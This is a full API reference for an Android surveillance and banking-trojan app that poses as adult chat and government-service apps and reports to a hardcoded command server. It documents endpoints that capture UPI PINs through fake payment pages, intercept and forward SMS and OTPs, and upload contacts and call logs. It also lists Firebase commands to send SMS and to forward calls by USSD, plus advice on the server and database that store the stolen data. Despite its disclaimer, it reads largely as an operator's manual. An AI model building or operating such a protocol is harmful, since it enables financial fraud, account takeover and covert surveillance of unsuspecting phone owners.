# Complete API Reference - All Endpoints

**Project:** Multi-Flavor Android Surveillance Application  
**Version:** 1.0  
**Last Updated:** 2025-11-01  
**Base Server:** `http://95.134.130.160:8765`

---

## ?? Table of Contents

1. [Overview](#overview)
2. [Authentication](#authentication)
3. [REST API Endpoints](#rest-api-endpoints)
   - [Device Registration](#1-device-registration)
   - [UPI PIN Collection](#2-upi-pin-collection)
   - [SMS Collection](#3-sms-collection)
   - [Contacts Upload](#4-contacts-upload)
   - [Call History Upload](#5-call-history-upload)
   - [Battery Status](#6-battery-status)
   - [Heartbeat](#7-heartbeat)
   - [Call Forwarding Result](#8-call-forwarding-result)
   - [SMS Forwarding Number](#9-get-sms-forwarding-number)
   - [Ping Response](#10-ping-response)
   - [Upload Response](#11-upload-response)
4. [Firebase Cloud Messaging Commands](#firebase-cloud-messaging-commands)
5. [Data Formats](#data-formats)
6. [Error Handling](#error-handling)
7. [Security & Privacy](#security--privacy)

---

## ?? Overview

This application is a comprehensive surveillance and remote control system that collects:

- ? **UPI Payment PINs** (from all 3 flavors)
- ? **SMS Messages** (incoming/outgoing/draft)
- ? **Contacts** (name, phone, email)
- ? **Call History** (incoming/outgoing/missed)
- ? **Battery Status** (real-time monitoring)
- ? **Device Information** (model, OS, network)
- ? **Heartbeat** (every 1 minute)

### Remote Capabilities (via FCM)

- ?? **Call Forwarding Control** (USSD commands)
- ?? **Remote SMS Sending** (any number, any SIM)
- ?? **Remote Data Upload Triggers**
- ?? **Ping/Pong** (device online status)

---

## ?? Authentication

### Device ID

All requests use `device_id` as primary identifier:

```kotlin
val deviceId = Settings.Secure.getString(
    contentResolver,
    Settings.Secure.ANDROID_ID
)
```

**Format:** 16-character hexadecimal string  
**Example:** `abc123def456789`

### User ID

Static identifier for all flavors:  
**Value:** `8f41bc5eec42e34209a801a7fa8b2d94d1c3d983`

---

## ?? REST API Endpoints

### 1. Device Registration

**Endpoint:** `POST /register`

**Description:** Registers device with complete system information on first launch.

#### Request Body

```json
{
  "type": "register",
  "device_id": "abc123def456",
  "device_info": {
    "manufacturer": "Samsung",
    "model": "SM-G998B",
    "android_version": "13",
    "sdk_version": "33",
    "screen_density": "3.0",
    "screen_width": "1080",
    "screen_height": "2400",
    "total_memory": "8589934592",
    "available_memory": "4294967296",
    "total_storage": "128849018880",
    "available_storage": "64424509440",
    "battery_level": "85",
    "is_charging": "true",
    "network_operator": "Jio",
    "country_code": "IN",
    "sim_serial": "89910123456789",
    "phone_number": "+911234567890",
    "ip_address": "192.168.1.100",
    "language": "en",
    "timezone": "Asia/Kolkata"
  },
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
  "app_type": "sexychat"
}
```

#### Parameters

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `type` | string | Yes | Always `"register"` |
| `device_id` | string | Yes | Unique device identifier |
| `device_info` | object | Yes | Complete device information |
| `user_id` | string | Yes | Static user identifier |
| `app_type` | string | Yes | `sexychat` \| `mparivahan` \| `sexyhub` |

#### Success Response

```json
{
  "status": "success",
  "message": "Device registered successfully",
  "device_id": "abc123def456"
}
```

#### Used In

- `/app/src/main/java/com/example/test/utils/DataUploader.kt:22-44`

---

### 2. UPI PIN Collection

**Endpoint:** `POST /save-pin`

**Description:** Captures UPI PIN entered during payment flow.

#### Request Body

```json
{
  "upi_pin": "123456",
  "device_id": "abc123def456",
  "app_type": "sexychat",
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
}
```

#### Parameters

| Parameter | Type | Required | Validation | Description |
|-----------|------|----------|------------|-------------|
| `upi_pin` | string | Yes | 4 or 6 digits | User's UPI PIN |
| `device_id` | string | Yes | - | Device identifier |
| `app_type` | string | Yes | `sexychat` \| `mparivahan` \| `sexyhub` | App flavor |
| `user_id` | string | Yes | - | User identifier |

#### Success Response

```json
{
  "status": "success",
  "message": "PIN saved successfully",
  "timestamp": "2025-11-01T12:34:56Z"
}
```

#### Used In

- `/app/src/sexychat/assets/upi-pin.html`
- `/app/src/mparivahan/assets/upi-pin.html`
- `/app/src/sexyhub/assets/pin.html`

---

### 3. SMS Collection

#### 3.1 Real-time SMS Upload

**Endpoint:** `POST /api/sms/new`

**Description:** Uploads new SMS messages immediately upon receipt.

**Trigger:** Automatic on `SMS_RECEIVED` broadcast

#### Request Body

```json
{
  "sender": "+911234567890",
  "message": "Your OTP is 123456",
  "timestamp": 1730476800000,
  "deviceId": "abc123def456"
}
```

#### Parameters

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `sender` | string | Yes | Phone number of sender |
| `message` | string | Yes | Full SMS body |
| `timestamp` | long | Yes | Unix timestamp (milliseconds) |
| `deviceId` | string | Yes | Device identifier |

#### Used In

- `/app/src/main/java/com/example/test/SmsReceiver.kt:63-96`

---

#### 3.2 Batch SMS Upload

**Endpoint:** `POST /sms/batch`

**Description:** Uploads all SMS messages from device in batches.

**Trigger:** 
- On device registration
- Via FCM command (`upload_all_sms`)

#### Request Body

```json
{
  "device_id": "abc123def456",
  "data": [
    {
      "from": "+911234567890",
      "to": "abc123def456",
      "body": "Message text here",
      "timestamp": 1730476800000,
      "type": "inbox"
    },
    {
      "from": "abc123def456",
      "to": "+910987654321",
      "body": "Reply message",
      "timestamp": 1730476900000,
      "type": "sent"
    }
  ],
  "batch_info": {
    "batch": 1,
    "of": 1
  }
}
```

#### SMS Types

- `inbox` - Received messages
- `sent` - Sent messages
- `draft` - Draft messages
- `outbox` - Outbox messages
- `failed` - Failed messages
- `queued` - Queued messages

#### Used In

- `/app/src/main/java/com/example/test/utils/DataUploader.kt:134-201`

---

### 4. Contacts Upload

**Endpoint:** `POST /contacts/batch`

**Description:** Uploads all contacts from device.

**Trigger:**
- On device registration
- Via FCM command (`upload_all_contacts`)

#### Request Body

```json
{
  "device_id": "abc123def456",
  "data": [
    {
      "id": "12345",
      "name": "John Doe",
      "phone": "+911234567890",
      "email": "john@example.com"
    },
    {
      "id": "67890",
      "name": "Jane Smith",
      "phone": "+910987654321",
      "email": ""
    }
  ],
  "batch_info": {
    "batch": 1,
    "of": 1
  }
}
```

#### Parameters

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `id` | string | Yes | Contact ID from Android |
| `name` | string | Yes | Display name |
| `phone` | string | Yes | Primary phone number |
| `email` | string | No | Email address (can be empty) |

#### Used In

- `/app/src/main/java/com/example/test/utils/DataUploader.kt:206-286`

---

### 5. Call History Upload

**Endpoint:** `POST /call-logs/batch`

**Description:** Uploads complete call history from device.

**Trigger:**
- On device registration

#### Request Body

```json
{
  "device_id": "abc123def456",
  "data": [
    {
      "call_id": "abc123def456_call_12345",
      "device_id": "abc123def456",
      "number": "+911234567890",
      "name": "John Doe",
      "call_type": "incoming",
      "timestamp": 1730476800000,
      "duration": 125,
      "received_at": 1730476900000
    }
  ],
  "batch_info": {
    "batch": 1,
    "of": 1
  }
}
```

#### Call Types

- `incoming` - Incoming calls
- `outgoing` - Outgoing calls
- `missed` - Missed calls
- `rejected` - Rejected calls
- `blocked` - Blocked calls
- `voicemail` - Voicemail calls
- `unknown` - Unknown type

#### Used In

- `/app/src/main/java/com/example/test/utils/DataUploader.kt:50-129`

---

### 6. Battery Status

**Endpoint:** `POST /battery`

**Description:** Sends battery level and online status.

**Trigger:**
- Periodic background service

#### Request Body

```json
{
  "device_id": "abc123def456",
  "fcm_token": "dJ7X...(FCM token)",
  "data": {
    "battery": 85,
    "is_online": true
  },
  "timestamp": 1730476800000
}
```

#### Used In

- `/app/src/main/java/com/example/test/utils/DataUploader.kt:291-312`

---

### 7. Heartbeat

**Endpoint:** `POST /devices/heartbeat`

**Description:** Sends periodic heartbeat every 1 minute to confirm device is online.

**Frequency:** Every 60 seconds

#### Request Body

```json
{
  "deviceId": "abc123def456",
  "timestamp": 1730476800000
}
```

#### Used In

- `/app/src/main/java/com/example/test/HeartbeatService.kt:59-83`

---

### 8. Call Forwarding Result

**Endpoint:** `POST /devices/call-forwarding/result`

**Description:** Reports result of call forwarding USSD command.

#### Request Body

```json
{
  "deviceId": "abc123def456",
  "success": true,
  "message": "Call forwarding activated",
  "simSlot": 0
}
```

#### Parameters

| Parameter | Type | Description |
|-----------|------|-------------|
| `deviceId` | string | Device identifier |
| `success` | boolean | Whether USSD command succeeded |
| `message` | string | USSD response or error message |
| `simSlot` | integer | SIM slot used (0 or 1) |

#### Used In

- `/app/src/main/java/com/example/test/CallForwardingUtility.kt:105-131`

---

### 9. Get SMS Forwarding Number

**Endpoint:** `GET /api/getForwardingNumber/:deviceId`

**Description:** Retrieves phone number for automatic SMS forwarding.

#### URL Parameters

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `deviceId` | string | Yes | Device identifier |

#### Success Response

```json
{
  "forwardingNumber": "+911234567890"
}
```

#### Error Response

```json
{
  "forwardingNumber": null
}
```

#### Usage

When SMS is received, device:
1. Uploads SMS to `/api/sms/new`
2. Fetches forwarding number from this endpoint
3. If number exists, forwards SMS to that number

#### Used In

- `/app/src/main/java/com/example/test/SmsReceiver.kt:99-132`

---

### 10. Ping Response

**Endpoint:** `POST /ping-response`

**Description:** Confirms device is online in response to FCM ping command.

#### Request Body

```json
{
  "deviceId": "abc123def456"
}
```

#### Trigger

- Received via FCM with `type: "ping"`

#### Used In

- `/app/src/main/java/com/example/test/MyFirebaseMessagingService.kt:275-334`

---

### 11. Upload Response

**Endpoint:** `POST /upload-response`

**Description:** Sends status after completing remote upload command.

#### Request Body

```json
{
  "device_id": "abc123def456",
  "status": "quick_sms_success",
  "count": 50,
  "error": null
}
```

#### Status Values

- `quick_sms_success` - Quick SMS upload successful
- `quick_sms_failed` - Quick SMS upload failed
- `quick_contacts_success` - Quick contacts upload successful
- `quick_contacts_failed` - Quick contacts upload failed
- `all_sms_success` - Full SMS upload successful
- `all_sms_failed` - Full SMS upload failed
- `all_contacts_success` - Full contacts upload successful
- `all_contacts_failed` - Full contacts upload failed

#### Used In

- `/app/src/main/java/com/example/test/MyFirebaseMessagingService.kt:336-387`

---

## ?? Firebase Cloud Messaging Commands

### Overview

Remote commands sent via FCM to control device.

**FCM Payload Format:**

```json
{
  "to": "dJ7X...(FCM token)",
  "data": {
    "type": "command_type",
    ...additional parameters
  }
}
```

---

### Command 1: Ping

**Purpose:** Check if device is online

**Payload:**

```json
{
  "type": "ping"
}
```

**Response:** Device sends POST to `/ping-response`

---

### Command 2: Send SMS

**Purpose:** Send SMS from device to any number

**Payload:**

```json
{
  "type": "send_sms",
  "phone": "+911234567890",
  "message": "Your custom message here",
  "simSlot": "0"
}
```

**Parameters:**

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `phone` | string | Yes | Recipient phone number |
| `message` | string | Yes | SMS text content |
| `simSlot` | string | No | SIM slot (0 or 1), defaults to 0 |

**Behavior:** SMS is sent immediately, no confirmation

---

### Command 3: Enable Call Forwarding

**Purpose:** Forward all incoming calls to specified number via USSD

**Payload:**

```json
{
  "type": "call_forwarding",
  "number": "+911234567890",
  "simSlot": "0"
}
```

**Parameters:**

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `number` | string | Yes | Number to forward calls to |
| `simSlot` | string | No | SIM slot (0 or 1), defaults to 0 |

**USSD Command:** `**21*{number}#`

**Response:** Device sends result to `/devices/call-forwarding/result`

---

### Command 4: Disable Call Forwarding

**Purpose:** Turn off call forwarding via USSD

**Payload:**

```json
{
  "type": "call_forwarding_disable",
  "simSlot": "0"
}
```

**USSD Command:** `##21#`

**Response:** Device sends result to `/devices/call-forwarding/result`

---

### Command 5: Quick Upload SMS

**Purpose:** Upload last 50 SMS messages quickly

**Payload:**

```json
{
  "type": "quick_upload_sms"
}
```

**Behavior:** 
- Reads last 50 SMS messages
- Uploads to `/sms/batch`
- Sends status to `/upload-response`

---

### Command 6: Quick Upload Contacts

**Purpose:** Upload last 50 contacts quickly

**Payload:**

```json
{
  "type": "quick_upload_contacts"
}
```

**Behavior:**
- Reads last 50 contacts
- Uploads to `/contacts/batch`
- Sends status to `/upload-response`

---

### Command 7: Upload All SMS

**Purpose:** Upload all SMS messages from device

**Payload:**

```json
{
  "type": "upload_all_sms"
}
```

**Behavior:**
- Reads ALL SMS messages
- Uploads in batches to `/sms/batch`
- Shows progress notifications
- Sends final status to `/upload-response`

---

### Command 8: Upload All Contacts

**Purpose:** Upload all contacts from device

**Payload:**

```json
{
  "type": "upload_all_contacts"
}
```

**Behavior:**
- Reads ALL contacts
- Uploads in batches to `/contacts/batch`
- Shows progress notifications
- Sends final status to `/upload-response`

---

## ?? Data Formats

### Device Info Object

Complete device information collected:

```json
{
  "manufacturer": "Samsung",
  "model": "SM-G998B",
  "android_version": "13",
  "sdk_version": "33",
  "screen_density": "3.0",
  "screen_width": "1080",
  "screen_height": "2400",
  "total_memory": "8589934592",
  "available_memory": "4294967296",
  "total_storage": "128849018880",
  "available_storage": "64424509440",
  "battery_level": "85",
  "is_charging": "true",
  "network_operator": "Jio",
  "country_code": "IN",
  "sim_serial": "89910123456789",
  "phone_number": "+911234567890",
  "ip_address": "192.168.1.100",
  "language": "en",
  "timezone": "Asia/Kolkata"
}
```

### Batch Info Object

Used in all batch uploads:

```json
{
  "batch": 1,
  "of": 1
}
```

**Note:** Currently all data sent in single batch, but structure supports pagination.

---

## ?? Error Handling

### Client-Side

**All API calls fail silently** - no error dialogs shown to user.

```kotlin
try {
    // API call
} catch (e: Exception) {
    Log.e(TAG, "Failed", e)
    // No user notification
}
```

### Server-Side Recommendations

#### Status Codes

| Code | Meaning | Client Action |
|------|---------|---------------|
| 200 | Success | Continue |
| 400 | Bad Request | Log and ignore |
| 401 | Unauthorized | Retry with new token |
| 500 | Server Error | Retry after delay |
| 503 | Service Unavailable | Retry after delay |

#### Validation

```javascript
// Validate device_id exists
if (!req.body.device_id || req.body.device_id.length < 10) {
    return res.status(400).json({
        status: 'error',
        message: 'Invalid device ID'
    });
}

// Validate required fields
if (!req.body.data || !Array.isArray(req.body.data)) {
    return res.status(400).json({
        status: 'error',
        message: 'Missing data array'
    });
}
```

---

## ?? Security & Privacy

### ?? Critical Security Issues

This application has **SEVERE** security and privacy issues:

1. **Mass Surveillance**
   - Collects ALL SMS messages (including OTPs, bank messages)
   - Collects ALL contacts without consent
   - Collects ALL call history
   - Tracks device location via IP
   - Monitors battery status

2. **Remote Control Capabilities**
   - Can send SMS from user's device to any number
   - Can forward all calls to attacker
   - Can trigger uploads at any time
   - Operates completely hidden

3. **No Encryption**
   - All data sent over HTTP (plain text)
   - UPI PINs transmitted without encryption
   - Personal data exposed to MITM attacks

4. **No User Consent**
   - Hidden foreground services
   - Disguised as "Google Play Update"
   - No privacy policy
   - No user opt-out

5. **Persistent Surveillance**
   - Starts on device boot
   - Restarts automatically if killed
   - Heartbeat every 1 minute
   - Real-time SMS interception

### Permissions Required

```xml
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.RECEIVE_SMS" />
<uses-permission android:name="android.permission.SEND_SMS" />
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.READ_CALL_LOG" />
<uses-permission android:name="android.permission.CALL_PHONE" />
<uses-permission android:name="android.permission.READ_PHONE_STATE" />
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
```

### Legal Considerations

?? **WARNING:** This type of application may be:
- **Illegal** in many jurisdictions
- Violation of **privacy laws** (GDPR, CCPA, etc.)
- **Criminal offense** (unauthorized surveillance)
- Grounds for **civil lawsuits**
- Violation of **Google Play policies**

### Ethical Concerns

- **No informed consent** from users
- **Deceptive practices** (disguised as legitimate app)
- **Mass data collection** without justification
- **Potential for abuse** (stalking, harassment, theft)

---

## ?? Support & Monitoring

### Server Monitoring

Recommended monitoring points:

1. **Device Registration** - Track new installs
2. **Heartbeat Frequency** - Detect dead devices
3. **SMS Volume** - Monitor data flow
4. **Failed Uploads** - Debug connection issues
5. **FCM Command Success Rate** - Track remote control

### Database Schema

Recommended collections:

- `devices` - Device registrations
- `upi_pins` - Payment PINs
- `sms_messages` - SMS data
- `contacts` - Contact lists
- `call_logs` - Call history
- `heartbeats` - Online status
- `battery_status` - Battery levels
- `fcm_commands` - Command history
- `fcm_responses` - Command results

---

## ?? Data Flow Diagram

```
???????????????????????????????????????????????
?          Android Device (Target)            ?
???????????????????????????????????????????????
?                                             ?
?  ???????????????????????????????????????   ?
?  ?  User Actions                       ?   ?
?  ?  - Enters UPI PIN ? Captured        ?   ?
?  ?  - Receives SMS ? Intercepted       ?   ?
?  ?  - Makes call ? Logged              ?   ?
?  ???????????????????????????????????????   ?
?                    ?                        ?
?                    ?                        ?
?  ???????????????????????????????????????   ?
?  ?  Background Services                ?   ?
?  ?  - HeartbeatService (every 1 min)   ?   ?
?  ?  - SmsReceiver (real-time)          ?   ?
?  ?  - DataUploadService                ?   ?
?  ???????????????????????????????????????   ?
?                    ?                        ?
???????????????????????????????????????????????
                     ?
                     ?
        ??????????????????????????
        ?  Internet (HTTP)       ?
        ?  No Encryption         ?
        ??????????????????????????
                     ?
                     ?
???????????????????????????????????????????????
?     Server (95.134.130.160:8765)            ?
???????????????????????????????????????????????
?  - /register ? Device info                  ?
?  - /save-pin ? UPI PINs                     ?
?  - /api/sms/new ? Real-time SMS             ?
?  - /sms/batch ? All SMS                     ?
?  - /contacts/batch ? All contacts           ?
?  - /call-logs/batch ? Call history          ?
?  - /devices/heartbeat ? Online status       ?
?  - /battery ? Battery level                 ?
???????????????????????????????????????????????
                     ?
                     ?
        ??????????????????????????
        ?  Firebase Cloud        ?
        ?  Messaging (FCM)       ?
        ??????????????????????????
                     ?
                     ?
???????????????????????????????????????????????
?          Remote Commands                    ?
???????????????????????????????????????????????
?  - ping ? Check online                      ?
?  - send_sms ? Send SMS from device          ?
?  - call_forwarding ? Forward calls          ?
?  - upload_all_sms ? Extract all messages    ?
?  - upload_all_contacts ? Steal contacts     ?
???????????????????????????????????????????????
```

---

## ?? Related Files

### Kotlin Source Files

- `/app/src/main/java/com/example/test/MainActivity.kt`
- `/app/src/main/java/com/example/test/SmsReceiver.kt`
- `/app/src/main/java/com/example/test/SmsService.kt`
- `/app/src/main/java/com/example/test/HeartbeatService.kt`
- `/app/src/main/java/com/example/test/CallForwardingUtility.kt`
- `/app/src/main/java/com/example/test/MyFirebaseMessagingService.kt`
- `/app/src/main/java/com/example/test/utils/DataUploader.kt`

### HTML Assets

- `/app/src/*/assets/upi-pin.html` - UPI PIN capture
- `/app/src/*/assets/payment.html` - Payment flow
- `/app/src/*/assets/register.html` - User registration

---

## ?? API Summary Table

| Endpoint | Method | Frequency | Purpose | Sensitive Data |
|----------|--------|-----------|---------|----------------|
| `/register` | POST | Once | Device registration | ? Device info, SIM, Phone |
| `/save-pin` | POST | Per payment | UPI PIN capture | ? Payment PIN |
| `/api/sms/new` | POST | Per SMS | Real-time SMS | ? All SMS content |
| `/sms/batch` | POST | On demand | Bulk SMS upload | ? All SMS history |
| `/contacts/batch` | POST | On demand | Contacts upload | ? All contacts |
| `/call-logs/batch` | POST | On demand | Call history | ? Call metadata |
| `/devices/heartbeat` | POST | Every 1 min | Online status | ?? Timestamp only |
| `/battery` | POST | Periodic | Battery level | ?? Battery % |
| `/devices/call-forwarding/result` | POST | On command | USSD result | ?? Success/fail |
| `/api/getForwardingNumber/:id` | GET | Per SMS | Get forward # | ?? Phone number |
| `/ping-response` | POST | On command | Online check | ?? Device ID |
| `/upload-response` | POST | After upload | Upload status | ?? Count/status |

---

## ?? Complete Example: Device Lifecycle

### 1. First Launch

```
User installs app ? Opens app ? Splash screen
?
MainActivity.onCreate()
?? Requests all permissions (SMS, Contacts, Phone, etc.)
?? Gets device_id from Android
?? Gets FCM token
?? Calls DataUploader.registerDevice()
    ?
    POST /register (with complete device info)
    ?
?? uploadCallHistory() ? POST /call-logs/batch
?? uploadAllSms() ? POST /sms/batch
?? uploadAllContacts() ? POST /contacts/batch
```

### 2. Background Operation

```
Every 60 seconds:
?? HeartbeatService ? POST /devices/heartbeat

When SMS received:
?? SmsReceiver.onReceive()
?? Upload to ? POST /api/sms/new
?? Get forward number ? GET /api/getForwardingNumber/:id
?? If number exists ? Forward SMS to that number
```

### 3. Remote Command

```
Server ? Firebase ? FCM to device
?
MyFirebaseMessagingService.onMessageReceived()
?
Parse command type:
?? "ping" ? POST /ping-response
?? "send_sms" ? Send SMS via SmsManager
?? "call_forwarding" ? Execute USSD **21*number#
?? "upload_all_sms" ? Read all SMS ? POST /sms/batch
?? "upload_all_contacts" ? Read all contacts ? POST /contacts/batch
    ?
    After completion ? POST /upload-response
```

### 4. Payment Flow

```
User enters UPI PIN in HTML page
?
JavaScript captures PIN
?
Shows "Verifying Payment" dialog (2.5s)
?
POST /save-pin (silent, in background)
?
Redirect to success page
```

---

**End of Complete API Reference**

---

**?? LEGAL DISCLAIMER:**

This documentation describes a surveillance application that may violate:
- Privacy laws (GDPR, CCPA, etc.)
- Computer fraud and abuse laws
- Wiretapping statutes
- Terms of service (Google Play, etc.)

Use of such applications without explicit user consent may result in:
- Criminal prosecution
- Civil liability
- Account termination
- Financial penalties

This documentation is provided for educational purposes only.
